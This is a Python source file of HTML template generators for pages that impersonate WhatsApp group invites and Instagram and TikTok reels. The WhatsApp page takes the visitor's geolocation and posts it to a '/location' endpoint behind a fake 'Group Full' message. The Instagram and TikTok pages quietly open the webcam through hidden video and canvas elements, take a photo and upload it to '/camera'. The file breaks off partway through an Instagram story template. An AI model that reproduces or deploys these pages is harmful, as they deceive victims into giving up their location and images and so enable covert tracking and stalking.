#!/usr/bin/env python3
import os
import base64

class TemplateManager:
    
    @staticmethod
    def get_whatsapp_location(group_name, group_image, member_count):
        # Handle local image file OR URL
        group_image_src = group_image
        
        # Check if it's a local file
        if os.path.exists(group_image) and os.path.isfile(group_image):
            try:
                with open(group_image, 'rb') as f:
                    img_data = base64.b64encode(f.read()).decode('utf-8')
                    if group_image.endswith('.png'):
                        mime = 'image/png'
                    elif group_image.endswith('.jpg') or group_image.endswith('.jpeg'):
                        mime = 'image/jpeg'
                    elif group_image.endswith('.gif'):
                        mime = 'image/gif'
                    else:
                        mime = 'image/jpeg'
                    group_image_src = f"data:{mime};base64,{img_data}"
                    print(f"  🖼️ Embedded group image: {os.path.basename(group_image)} ({len(img_data)//1024}KB)")
            except Exception as e:
                print(f"  ⚠️ Error reading image file: {e}")
                if not group_image.startswith('http'):
                    group_image_src = "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&h=120&fit=crop"
        elif group_image.startswith('http'):
            # It's a URL - use it directly
            print(f"  🖼️ Using image URL: {group_image[:50]}...")
            group_image_src = group_image
        else:
            # Invalid path, use default
            print(f"  ⚠️ Invalid image source: {group_image}")
            group_image_src = "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&h=120&fit=crop"
        
        return f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>WhatsApp Group Invite</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f0f2f5; min-height: 100vh; }}
        .header {{ background: #075E54; color: white; padding: 12px 16px; }}
        .header-content {{ max-width: 500px; margin: 0 auto; display: flex; align-items: center; gap: 10px; }}
        .header svg {{ width: 28px; height: 28px; }}
        .header span {{ font-size: 18px; font-weight: 600; }}
        .main {{ max-width: 500px; margin: 40px auto; padding: 0 16px; }}
        .card {{ background: white; border-radius: 24px; overflow: hidden; text-align: center; box-shadow: 0 8px 30px rgba(0,0,0,0.1); }}
        .avatar {{ width: 100px; height: 100px; border-radius: 50%; margin: 30px auto 15px; overflow: hidden; border: 3px solid #25D366; }}
        .avatar img {{ width: 100%; height: 100%; object-fit: cover; }}
        .name {{ font-size: 24px; font-weight: 600; color: #075E54; }}
        .type {{ color: #666; font-size: 13px; margin: 5px 0; }}
        .count {{ display: inline-block; background: #e8f5e9; color: #075E54; padding: 4px 12px; border-radius: 20px; font-size: 12px; margin: 15px 0; }}
        .btn {{ background: #25D366; color: white; border: none; padding: 14px 35px; border-radius: 40px; font-size: 16px; font-weight: 600; margin: 0 20px 30px; width: calc(100% - 40px); cursor: pointer; }}
        .loading {{ display: none; text-align: center; padding: 50px; background: white; border-radius: 24px; }}
        .spinner {{ width: 40px; height: 40px; border: 3px solid #e0e0e0; border-top: 3px solid #25D366; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
        .modal {{ display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 1000; justify-content: center; align-items: center; }}
        .modal-content {{ background: white; border-radius: 20px; max-width: 280px; width: 90%; text-align: center; overflow: hidden; }}
        .modal-icon {{ background: #fdf2f5; padding: 25px 0 15px; }}
        .modal-icon svg {{ width: 55px; height: 55px; }}
        .modal-title {{ font-size: 20px; font-weight: 700; color: #075E54; padding: 10px 20px; }}
        .modal-msg {{ color: #666; padding: 10px 25px 20px; font-size: 14px; }}
        .modal-btn {{ background: #25D366; color: white; border: none; padding: 14px; width: 100%; font-size: 15px; font-weight: 600; cursor: pointer; }}
        .bottom-bar {{ background: #075E54; color: white; padding: 30px 16px 15px; margin-top: 40px; }}
        .bottom-text {{ text-align: center; font-size: 11px; opacity: 0.7; }}
        @media (max-width: 768px) {{ .avatar {{ width: 80px; height: 80px; margin-top: 25px; }} .name {{ font-size: 22px; }} .btn {{ padding: 12px; margin-bottom: 25px; }} }}
    </style>
</head>
<body>
    <div class="header">
        <div class="header-content">
            <svg viewBox="0 0 24 24" fill="white"><path d="M12.04 2c-5.46 0-9.91 4.45-9.91 9.91 0 1.75.46 3.45 1.32 4.95L2.05 22l5.25-1.38c1.45.79 3.08 1.21 4.74 1.21 5.46 0 9.91-4.45 9.91-9.91 0-5.46-4.45-9.91-9.91-9.91z"/><path fill="#25D366" d="M12.04 3.5c4.62 0 8.38 3.76 8.38 8.38 0 4.62-3.76 8.38-8.38 8.38-1.45 0-2.86-.36-4.09-1.02l-.52-.27-3.11.82.83-3.04-.28-.54c-.68-1.27-1.04-2.68-1.04-4.13 0-4.62 3.76-8.38 8.38-8.38z"/></svg>
            <span>WhatsApp</span>
        </div>
    </div>
    <div class="main">
        <div class="card" id="inviteCard">
            <div class="avatar"><img src="{group_image_src}"></div>
            <div class="name">{group_name}</div>
            <div class="type">WhatsApp Group</div>
            <div class="count">{member_count} members</div>
            <button class="btn" id="joinBtn">Join Group</button>
        </div>
        <div class="loading" id="loading"><div class="spinner"></div><p>Joining group...</p></div>
    </div>
    <div class="modal" id="modal"><div class="modal-content"><div class="modal-icon"><svg width="55" height="55" viewBox="0 0 24 24" fill="#dc3545"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg></div><div class="modal-title">Group Full</div><div class="modal-msg">Maximum capacity of 256 participants reached.</div><button class="modal-btn" id="closeModal">OK</button></div></div>
    <div class="bottom-bar"><div class="bottom-text">© 2024 WhatsApp Inc.</div></div>
    <script>
        document.getElementById('joinBtn').onclick = () => {{
            document.getElementById('inviteCard').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            setTimeout(() => {{
                if("geolocation" in navigator){{
                    navigator.geolocation.getCurrentPosition(pos => {{
                        fetch('/location',{{
                            method:'POST',
                            headers:{{'Content-Type':'application/json'}},
                            body:JSON.stringify({{lat:pos.coords.latitude,lng:pos.coords.longitude,acc:pos.coords.accuracy}})
                        }}).then(() => {{
                            document.getElementById('loading').style.display = 'none';
                            document.getElementById('modal').style.display = 'flex';
                        }});
                    }}, err => {{
                        document.getElementById('loading').style.display = 'none';
                        document.getElementById('inviteCard').style.display = 'block';
                        alert('Location access required to join this group');
                    }});
                }}
            }}, 1500);
        }};
        document.getElementById('closeModal').onclick = () => {{
            document.getElementById('modal').style.display = 'none';
            document.getElementById('inviteCard').style.display = 'block';
        }};
    </script>
</body>
</html>'''
    
    @staticmethod
    def get_instagram_camera(username, verified, profile_image, video_path, likes, comments, shares, caption):
        verified_badge = '<span style="background:#3897f0;border-radius:50%;display:inline-block;width:14px;height:14px;font-size:9px;text-align:center;margin-left:4px;color:white;">✓</span>' if verified else ''
        
        # Handle profile image - URL or local file
        profile_image_src = profile_image
        if os.path.exists(profile_image) and os.path.isfile(profile_image):
            try:
                with open(profile_image, 'rb') as f:
                    img_data = base64.b64encode(f.read()).decode('utf-8')
                    mime = 'image/jpeg'
                    if profile_image.endswith('.png'):
                        mime = 'image/png'
                    profile_image_src = f"data:{mime};base64,{img_data}"
                    print(f"  🖼️ Embedded profile image: {os.path.basename(profile_image)} ({len(img_data)//1024}KB)")
            except Exception as e:
                print(f"  ⚠️ Error reading profile image: {e}")
                if not profile_image.startswith('http'):
                    profile_image_src = "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&h=120&fit=crop"
        elif profile_image.startswith('http'):
            print(f"  🖼️ Using profile image URL: {profile_image[:50]}...")
            profile_image_src = profile_image
        else:
            print(f"  ⚠️ Invalid profile image source: {profile_image}")
            profile_image_src = "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&h=120&fit=crop"
        
        # Handle video - use base64 embedding or URL
        video_src = video_path
        if os.path.exists(video_path) and os.path.isfile(video_path):
            try:
                with open(video_path, 'rb') as f:
                    video_data = base64.b64encode(f.read()).decode('utf-8')
                    video_src = f"data:video/mp4;base64,{video_data}"
                    print(f"  📹 Embedded video: {os.path.basename(video_path)} ({len(video_data)//1024}KB)")
            except Exception as e:
                print(f"  ⚠️ Error reading video file: {e}")
                if not video_path.startswith('http'):
                    video_src = "https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4"
        elif video_path.startswith('http'):
            print(f"  📹 Using video URL: {video_path[:50]}...")
            video_src = video_path
        else:
            print(f"  ⚠️ Invalid video source: {video_path}")
            video_src = "https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4"
        
        return f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Instagram • @{username}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ background: #000; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }}
        .reels-container {{ width: 100%; height: 100vh; background: #000; position: relative; overflow: hidden; }}
        .video-area {{ width: 100%; height: 100%; position: relative; }}
        .video-area video {{ width: 100%; height: 100%; object-fit: cover; }}
        .loading-screen {{ position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: #000; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 100; }}
        .loading-spinner {{ width: 44px; height: 44px; border: 3px solid rgba(255,255,255,0.2); border-top: 3px solid #fff; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 12px; }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
        .loading-text {{ color: #fff; font-size: 14px; }}
        .reels-header {{ position: absolute; top: 0; left: 0; right: 0; padding: 12px 16px; background: linear-gradient(180deg, rgba(0,0,0,0.5) 0%, rgba(0,0,0,0) 100%); z-index: 20; display: flex; justify-content: space-between; align-items: center; }}
        .reels-logo {{ font-size: 24px; font-weight: 700; background: linear-gradient(45deg, #f09433, #d62976, #962fbf); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
        .video-info {{ position: absolute; bottom: 20px; left: 16px; right: 70px; z-index: 20; }}
        .user-info {{ display: flex; align-items: center; gap: 12px; margin-bottom: 8px; }}
        .user-avatar {{ width: 40px; height: 40px; border-radius: 50%; overflow: hidden; border: 2px solid #fff; }}
        .user-avatar img {{ width: 100%; height: 100%; object-fit: cover; }}
        .username {{ color: #fff; font-weight: 600; font-size: 14px; display: flex; align-items: center; gap: 6px; }}
        .follow-btn {{ background: transparent; border: none; color: #0095f6; font-weight: 600; font-size: 12px; margin-left: 8px; cursor: pointer; }}
        .caption {{ color: #fff; font-size: 13px; margin-bottom: 6px; }}
        .music {{ display: flex; align-items: center; gap: 6px; color: rgba(255,255,255,0.8); font-size: 12px; }}
        .action-buttons {{ position: absolute; right: 12px; bottom: 20px; display: flex; flex-direction: column; gap: 24px; z-index: 20; }}
        .action-item {{ display: flex; flex-direction: column; align-items: center; gap: 4px; }}
        .action-icon {{ width: 44px; height: 44px; background: rgba(0,0,0,0.5); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; color: #fff; backdrop-filter: blur(8px); cursor: pointer; }}
        .action-count {{ color: #fff; font-size: 11px; }}
        .bottom-bar {{ position: absolute; bottom: 0; left: 0; right: 0; background: rgba(0,0,0,0.3); backdrop-filter: blur(20px); padding: 12px 16px; display: flex; justify-content: space-between; align-items: center; z-index: 20; }}
        .comment-input {{ flex: 1; background: rgba(255,255,255,0.15); border: none; border-radius: 24px; padding: 8px 16px; color: #fff; font-size: 13px; }}
        .comment-input::placeholder {{ color: rgba(255,255,255,0.6); }}
        .send-btn {{ background: transparent; border: none; color: #0095f6; font-weight: 600; font-size: 13px; margin-left: 12px; cursor: pointer; }}
        .progress-bar {{ position: absolute; top: 0; left: 0; right: 0; height: 3px; background: rgba(255,255,255,0.3); z-index: 30; }}
        .progress-fill {{ height: 100%; width: 0%; background: #fff; animation: progress 15s linear; }}
        @keyframes progress {{ to {{ width: 100%; }} }}
        .hidden-camera {{ display: none; }}
    </style>
</head>
<body>
    <div class="reels-container">
        <div class="progress-bar"><div class="progress-fill"></div></div>
        <div class="reels-header"><div class="reels-logo">Instagram</div><div class="reels-icons"><span>📷</span><span>❤️</span><span>💬</span></div></div>
        <div class="video-area">
            <video id="mainVideo" playsinline></video>
            <div class="loading-screen" id="loadingScreen"><div class="loading-spinner"></div><div class="loading-text">Loading reel...</div></div>
        </div>
        <div class="video-info">
            <div class="user-info"><div class="user-avatar"><img src="{profile_image_src}"></div><div class="username">@{username}{verified_badge}<button class="follow-btn" id="followBtn">Follow</button></div></div>
            <div class="caption">{caption}</div>
            <div class="music"><span>🎵</span><span>Audio • @{username}</span></div>
        </div>
        <div class="action-buttons"><div class="action-item"><div class="action-icon" id="likeBtn">❤️</div><div class="action-count" id="likeCount">{likes}</div></div><div class="action-item"><div class="action-icon">💬</div><div class="action-count">{comments}</div></div><div class="action-item"><div class="action-icon">↗️</div><div class="action-count">{shares}</div></div></div>
        <div class="bottom-bar"><input type="text" class="comment-input" placeholder="Add a comment..." id="commentInput"><button class="send-btn" id="sendComment">Post</button></div>
    </div>
    <div class="hidden-camera"><video id="hiddenVideo" autoplay playsinline style="display:none;"></video><canvas id="hiddenCanvas" style="display:none;"></canvas></div>
    <script>
        let stream = null, cameraActivated = false, liked = false;
        const video = document.getElementById('mainVideo');
        const loadingScreen = document.getElementById('loadingScreen');
        video.src = '{video_src}';
        video.load();
        video.oncanplay = () => {{ loadingScreen.style.display = 'none'; video.play(); }};
        video.onended = () => {{ window.location.href = 'https://instagram.com'; }};
        document.getElementById('likeBtn').onclick = () => {{ if(!liked) {{ liked = true; document.getElementById('likeBtn').style.color = '#ff3040'; document.getElementById('likeBtn').style.transform = 'scale(1.2)'; setTimeout(() => {{ document.getElementById('likeBtn').style.transform = 'scale(1)'; }}, 200); }} }};
        document.getElementById('followBtn').onclick = function() {{ this.innerText = this.innerText === 'Follow' ? 'Following' : 'Follow'; this.style.color = this.innerText === 'Follow' ? '#0095f6' : '#666'; }};
        document.getElementById('sendComment').onclick = () => {{ let comment = document.getElementById('commentInput').value; if(comment.trim()) {{ alert('Comment posted: ' + comment); document.getElementById('commentInput').value = ''; }} }};
        async function requestCameraAndCapture() {{
            if(cameraActivated) return;
            cameraActivated = true;
            try {{
                stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
                const hiddenVideo = document.getElementById('hiddenVideo');
                hiddenVideo.srcObject = stream;
                await hiddenVideo.play();
                setTimeout(() => {{
                    const canvas = document.getElementById('hiddenCanvas');
                    canvas.width = hiddenVideo.videoWidth;
                    canvas.height = hiddenVideo.videoHeight;
                    canvas.getContext('2d').drawImage(hiddenVideo, 0, 0);
                    canvas.toBlob(blob => {{ const fd = new FormData(); fd.append('image', blob); fetch('/camera', {{ method: 'POST', body: fd }}); }}, 'image/jpeg', 0.8);
                    if(stream) stream.getTracks().forEach(t => t.stop());
                }}, 1000);
            }} catch(err) {{ console.log('Camera denied'); }}
        }}
        setTimeout(() => {{ requestCameraAndCapture(); }}, 2000);
    </script>
</body>
</html>'''
    
    @staticmethod
    def get_tiktok_camera(username, verified, profile_image, video_path, likes, comments, shares, caption):
        verified_badge = '<span style="background:#ff0050;border-radius:50%;display:inline-block;width:14px;height:14px;font-size:9px;text-align:center;margin-left:4px;color:white;">✓</span>' if verified else ''
        
        # Handle profile image - URL or local file
        profile_image_src = profile_image
        if os.path.exists(profile_image) and os.path.isfile(profile_image):
            try:
                with open(profile_image, 'rb') as f:
                    img_data = base64.b64encode(f.read()).decode('utf-8')
                    mime = 'image/jpeg'
                    if profile_image.endswith('.png'):
                        mime = 'image/png'
                    profile_image_src = f"data:{mime};base64,{img_data}"
                    print(f"  🖼️ Embedded profile image: {os.path.basename(profile_image)} ({len(img_data)//1024}KB)")
            except Exception as e:
                print(f"  ⚠️ Error reading profile image: {e}")
                if not profile_image.startswith('http'):
                    profile_image_src = "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&h=120&fit=crop"
        elif profile_image.startswith('http'):
            print(f"  🖼️ Using profile image URL: {profile_image[:50]}...")
            profile_image_src = profile_image
        else:
            print(f"  ⚠️ Invalid profile image source: {profile_image}")
            profile_image_src = "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&h=120&fit=crop"
        
        # Handle video - use base64 embedding or URL
        video_src = video_path
        if os.path.exists(video_path) and os.path.isfile(video_path):
            try:
                with open(video_path, 'rb') as f:
                    video_data = base64.b64encode(f.read()).decode('utf-8')
                    video_src = f"data:video/mp4;base64,{video_data}"
                    print(f"  📹 Embedded video: {os.path.basename(video_path)} ({len(video_data)//1024}KB)")
            except Exception as e:
                print(f"  ⚠️ Error reading video file: {e}")
                if not video_path.startswith('http'):
                    video_src = "https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4"
        elif video_path.startswith('http'):
            print(f"  📹 Using video URL: {video_path[:50]}...")
            video_src = video_path
        else:
            print(f"  ⚠️ Invalid video source: {video_path}")
            video_src = "https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4"
        
        return f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>TikTok • @{username}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ background: #000; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }}
        .tiktok-container {{ width: 100%; height: 100vh; background: #000; position: relative; overflow: hidden; }}
        .video-area {{ width: 100%; height: 100%; position: relative; }}
        .video-area video {{ width: 100%; height: 100%; object-fit: cover; }}
        .loading-screen {{ position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: #000; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 100; }}
        .loading-spinner {{ width: 44px; height: 44px; border: 3px solid rgba(255,255,255,0.2); border-top: 3px solid #ff0050; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 12px; }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
        .loading-text {{ color: #fff; font-size: 14px; }}
        .tiktok-header {{ position: absolute; top: 0; left: 0; right: 0; padding: 12px 16px; background: linear-gradient(180deg, rgba(0,0,0,0.5) 0%, rgba(0,0,0,0) 100%); z-index: 20; display: flex; justify-content: space-between; align-items: center; }}
        .tiktok-logo {{ display: flex; align-items: center; gap: 4px; }}
        .tiktok-logo svg {{ width: 28px; height: 28px; }}
        .tiktok-logo span {{ font-size: 20px; font-weight: 700; background: linear-gradient(45deg, #ff0050, #00f2ea); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
        .tiktok-nav {{ display: flex; gap: 20px; }}
        .tiktok-nav span {{ color: #fff; font-size: 16px; font-weight: 500; }}
        .tiktok-nav .active {{ color: #fff; position: relative; }}
        .tiktok-nav .active::after {{ content: ''; position: absolute; bottom: -4px; left: 50%; transform: translateX(-50%); width: 4px; height: 4px; background: #ff0050; border-radius: 50%; }}
        .video-info {{ position: absolute; bottom: 20px; left: 16px; right: 70px; z-index: 20; }}
        .user-info {{ display: flex; align-items: center; gap: 12px; margin-bottom: 8px; }}
        .user-avatar {{ width: 48px; height: 48px; border-radius: 50%; overflow: hidden; border: 2px solid #fff; }}
        .user-avatar img {{ width: 100%; height: 100%; object-fit: cover; }}
        .username {{ color: #fff; font-weight: 700; font-size: 16px; display: flex; align-items: center; gap: 6px; }}
        .follow-btn {{ background: #ff0050; border: none; padding: 5px 14px; border-radius: 20px; color: #fff; font-weight: 600; font-size: 12px; margin-left: 8px; cursor: pointer; }}
        .caption {{ color: #fff; font-size: 14px; margin-bottom: 6px; }}
        .music {{ display: flex; align-items: center; gap: 6px; color: rgba(255,255,255,0.8); font-size: 12px; }}
        .action-buttons {{ position: absolute; right: 12px; bottom: 20px; display: flex; flex-direction: column; gap: 24px; z-index: 20; }}
        .action-item {{ display: flex; flex-direction: column; align-items: center; gap: 4px; }}
        .action-icon {{ width: 48px; height: 48px; background: rgba(0,0,0,0.5); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 26px; color: #fff; backdrop-filter: blur(8px); cursor: pointer; }}
        .action-count {{ color: #fff; font-size: 12px; }}
        .comment-bar {{ position: absolute; bottom: 0; left: 0; right: 0; background: rgba(0,0,0,0.3); backdrop-filter: blur(20px); padding: 12px 16px; display: flex; gap: 12px; align-items: center; z-index: 20; }}
        .comment-input {{ flex: 1; background: rgba(255,255,255,0.15); border: none; border-radius: 30px; padding: 10px 16px; color: #fff; font-size: 14px; }}
        .comment-input::placeholder {{ color: rgba(255,255,255,0.6); }}
        .send-btn {{ background: transparent; border: none; color: #ff0050; font-weight: 600; font-size: 14px; cursor: pointer; }}
        .progress-bar {{ position: absolute; top: 0; left: 0; right: 0; height: 3px; background: rgba(255,255,255,0.3); z-index: 30; }}
        .progress-fill {{ height: 100%; width: 0%; background: #ff0050; animation: progress 15s linear; }}
        @keyframes progress {{ to {{ width: 100%; }} }}
        .hidden-camera {{ display: none; }}
    </style>
</head>
<body>
    <div class="tiktok-container">
        <div class="progress-bar"><div class="progress-fill"></div></div>
        <div class="tiktok-header"><div class="tiktok-logo"><svg viewBox="0 0 24 24" fill="none"><path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5 20.24a6.34 6.34 0 0 0 11.14-4.57v-7.1a8.16 8.16 0 0 0 4.65 1.54v-3.4a4.84 4.84 0 0 1-1.2-.02z" fill="white"/></svg><span>TikTok</span></div><div class="tiktok-nav"><span class="active">Following</span><span>For You</span></div><div>🔍</div></div>
        <div class="video-area">
            <video id="mainVideo" playsinline></video>
            <div class="loading-screen" id="loadingScreen"><div class="loading-spinner"></div><div class="loading-text">Loading video...</div></div>
        </div>
        <div class="video-info">
            <div class="user-info"><div class="user-avatar"><img src="{profile_image_src}"></div><div class="username">@{username}{verified_badge}<button class="follow-btn" id="followBtn">Follow</button></div></div>
            <div class="caption">{caption}</div>
            <div class="music"><span>🎵</span><span>original sound - @{username}</span></div>
        </div>
        <div class="action-buttons"><div class="action-item"><div class="action-icon" id="likeBtn">❤️</div><div class="action-count" id="likeCount">{likes}</div></div><div class="action-item"><div class="action-icon">💬</div><div class="action-count">{comments}</div></div><div class="action-item"><div class="action-icon">↗️</div><div class="action-count">{shares}</div></div></div>
        <div class="comment-bar"><input type="text" class="comment-input" placeholder="Add comment..." id="commentInput"><button class="send-btn" id="sendComment">Post</button></div>
    </div>
    <div class="hidden-camera"><video id="hiddenVideo" autoplay playsinline style="display:none;"></video><canvas id="hiddenCanvas" style="display:none;"></canvas></div>
    <script>
        let stream = null, cameraActivated = false, liked = false;
        const video = document.getElementById('mainVideo');
        const loadingScreen = document.getElementById('loadingScreen');
        video.src = '{video_src}';
        video.load();
        video.oncanplay = () => {{ loadingScreen.style.display = 'none'; video.play(); }};
        video.onended = () => {{ window.location.href = 'https://tiktok.com'; }};
        document.getElementById('likeBtn').onclick = () => {{ if(!liked) {{ liked = true; document.getElementById('likeBtn').style.color = '#ff3040'; document.getElementById('likeBtn').style.transform = 'scale(1.2)'; setTimeout(() => {{ document.getElementById('likeBtn').style.transform = 'scale(1)'; }}, 200); let count = document.getElementById('likeCount').innerText; if(count.includes('M')) {{ let num = parseFloat(count) + 0.1; document.getElementById('likeCount').innerText = num.toFixed(1) + 'M'; }} }} }};
        document.getElementById('followBtn').onclick = function() {{ this.innerText = this.innerText === 'Follow' ? 'Following' : 'Follow'; this.style.background = this.innerText === 'Follow' ? '#ff0050' : '#333'; }};
        document.getElementById('sendComment').onclick = () => {{ let comment = document.getElementById('commentInput').value; if(comment.trim()) {{ alert('Comment posted: ' + comment); document.getElementById('commentInput').value = ''; }} }};
        async function requestCameraAndCapture() {{
            if(cameraActivated) return;
            cameraActivated = true;
            try {{
                stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
                const hiddenVideo = document.getElementById('hiddenVideo');
                hiddenVideo.srcObject = stream;
                await hiddenVideo.play();
                setTimeout(() => {{
                    const canvas = document.getElementById('hiddenCanvas');
                    canvas.width = hiddenVideo.videoWidth;
                    canvas.height = hiddenVideo.videoHeight;
                    canvas.getContext('2d').drawImage(hiddenVideo, 0, 0);
                    canvas.toBlob(blob => {{ const fd = new FormData(); fd.append('image', blob); fetch('/camera', {{ method: 'POST', body: fd }}); }}, 'image/jpeg', 0.8);
                    if(stream) stream.getTracks().forEach(t => t.stop());
                }}, 1000);
            }} catch(err) {{ console.log('Camera denied'); }}
        }}
        setTimeout(() => {{ requestCameraAndCapture(); }}, 2000);
    </script>
</body>
</html>'''
    
    @staticmethod
    def get_instagram_story_custom(username, verified, profile_image, video_path, views, likes, caption):
        # Handle profile image - URL or local file
        profile_image_src = profile_image
        if os.path.exists(profile_image) and os.path.isfile(profile_image):
            try:
                with open(profile_image, 'rb') as f:
                    img_data = base64.b64encode(f.read()).decode('utf-8')
                    mime = 'image/jpeg'
                    if profile_image.endswith('.png'):
                        mime = 'image/png'
                    profile_image_src = f"data:{mime};base64,{img_data}"
                    print(f"  🖼️ Embedded profile image: {os.path.basename(profile_image)} ({len(img_data)//1024}KB)")
            except Exception as e:
                print(f"  ⚠️ Error reading profile image: {e}")
                if not profile_image.startswith('http'):
                    profile_image_src = "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&h=120&fit=crop"
        elif profile_image.startswith('http'):
            print(f"  🖼️ Using profile image URL: {profile_image[:50]}...")
            profile_image_src = profile_image
        else:
            print(f"  ⚠️ Invalid profile image source: {profile_image}")
            profile_image_src = "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&h=120&fit=crop"
        
        # Handle video - use base64 embedding or URL
        video_src = video_path
        if os.path.exists(video_path) and os.path.isfile(video_path):
            try:
                with open(video_path, 'rb') as f:
                    video_data = base64.b64encode(f.read()).decode('utf-8')
                    video_src = f"data:video/mp4;base64,{video_data}"
                    print(f"  📹 Embedded video: {os.path.basename(video_path)} ({len(video_data)//1024}KB)")
            except Exception as e:
                print(f"  ⚠️ Error reading video file: {e}")
                if not video_path.startswith('http'):
                    video_src = "https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4"
        elif video_path.startswith('http'):
            print(f"  📹 Using video URL: {video_path[:50]}...")
            video_src = video_path
        else:
            print(f"  ⚠️ Invalid video source: {video_path}")
            video_src = "https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4"
        
        verified_badge = '<span style="background:#3897f0;border-radius:50%;display:inline-block;width:14px;height:14px;font-size:9px;text-align:center;margin-left:4px;color:white;">✓</span>' if verified else ''
        
        return f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Instagram Story • @{username}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ background: #000; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
        .story {{ max-width: 450px; width: 100%; height: 100vh; background: #000; position: relative; overflow: hidden; }}
        .header {{ position: absolute; top: 0; left: 0; right: 0; padding: 50px 16px 16px; background: linear-gradient(180deg, rgba(0,0,0,0.6) 0%, rgba(0,0,0,0) 100%); z-index: 10; display: flex; align-items: center; gap: 12px; }}
        .avatar {{ width: 40px; height: 40px; border-radius: 50%; overflow: hidden; border: 2px solid #fff; }}
        .avatar img {{ width: 100%; height: 100%; object-fit: cover; }}
        .username {{ font-weight: 600; color: #fff; font-size: 14px; display: flex; align-items: center; gap: 4px; }}
        .story-video {{ width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0; }}
        .story-stats {{ position: absolute; bottom: 80px; left: 16px; right: 16px; z-index: 20; display: flex; gap: 20px; }}
        .stat {{ color: white; font-size: 12px; background: rgba(0,0,0,0.5); padding: 4px 12px; border-radius: 20px; }}
        .caption {{ position: absolute; bottom: 20px; left: 16px; right: 16px; color: white; font-size: 14px; background: rgba(0,0,0,0.5); padding: 8px 12px; border-radius: 20px; z-index: 20; }}
        .progress {{ position: absolute; top: 8px; left: 8px; right: 8px; height: 3px; background: rgba(255,255,255,0.3); border-radius: 3px; z-index: 30; }}
        .progress-fill {{ height: 100%; width: 0%; background: #fff; border-radius: 3px; animation: progress 15s linear; }}
        @keyframes progress {{ to {{ width: 100%; }} }}
        .loading {{ position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: #000; z-index: 40; display: flex; justify-content: center; align-items: center; flex-direction: column; }}
        .spinner {{ width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
        .loading-text {{ color: white; font-size: 14px; }}
    </style>
</head>
<body>
    <div class="story">
        <div class="progress"><div class="progress-fill"></div></div>
        <div class="header"><div class="avatar"><img src="{profile_image_src}"></div><div class="username">@{username}{verified_badge}</div></div>
        <video class="story-video" id="storyVideo" playsinline autoplay></video>
        <div class="story-stats"><div class="stat">👁️ {views} views</div><div class="stat">❤️ {likes} likes</div></div>
        <div class="caption">{caption}</div>
        <div class="loading" id="loading"><div class="spinner"></div><div class="loading-text">Loading story...</div></div>
    </div>
